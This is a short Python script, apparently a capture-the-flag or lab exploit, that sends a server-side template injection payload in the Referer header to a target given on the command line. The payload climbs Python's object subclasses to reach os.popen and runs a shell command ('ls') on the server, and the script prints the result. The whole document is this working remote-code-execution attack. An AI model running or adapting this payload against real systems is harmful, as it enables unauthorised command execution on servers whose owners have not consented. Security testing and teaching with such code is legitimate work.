import sys

import requests

PORT = 7000
payload = '''{{ ''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}'''

headers = {
    'Referer': payload,
}

r = requests.get(f'http://{sys.argv[1]}:{PORT}/', headers=headers)
print(r.text)
